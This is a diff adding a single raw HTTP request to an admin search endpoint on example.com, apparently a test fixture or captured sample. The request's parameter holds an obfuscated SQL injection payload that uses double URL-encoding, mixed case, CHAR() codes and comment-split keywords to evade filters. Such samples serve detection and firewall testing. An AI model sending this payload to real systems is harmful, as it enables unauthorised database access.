@@ -1,0 +1,6 @@
+GET /admin?search=%27%252520oR%252520CHAR%2870%2C82%2C79%2C77%29_baSE64%28%27dW5PB24gc2VSZWn0idesMiwz%27%29--%3B%252520S/%2A%2184239%2A/ELECT%252520NULL%2C%252520NULL HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+
